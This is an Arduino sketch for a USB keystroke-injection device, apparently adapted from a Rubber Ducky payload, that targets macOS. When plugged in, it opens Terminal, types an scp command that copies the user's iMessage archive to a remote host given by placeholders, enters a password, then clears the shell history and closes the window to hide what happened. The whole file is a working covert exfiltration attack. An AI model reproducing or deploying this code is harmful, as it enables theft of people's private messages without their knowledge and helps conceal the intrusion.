#include <Keyboard.h>

//Sends iMessages to a server
//https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---OSX-iMessage-Capture

void setup() {
  Serial.begin(9600);
  
  pinMode(3, INPUT_PULLUP);
  if (digitalRead(3) == LOW) {
    Serial.print("aborting\n");
    abort();
  }

  Keyboard.begin();
  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);
  
  Keyboard.print("terminal");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  
  delay(750);

  Keyboard.print("scp -r ~/Library/Messages/Archive [USER]@[IP HERE]:~/[PATH]");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("[PASSWORD HERE]");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("history -c");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("clear");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();
  
  Keyboard.end();
}

void loop() {
}
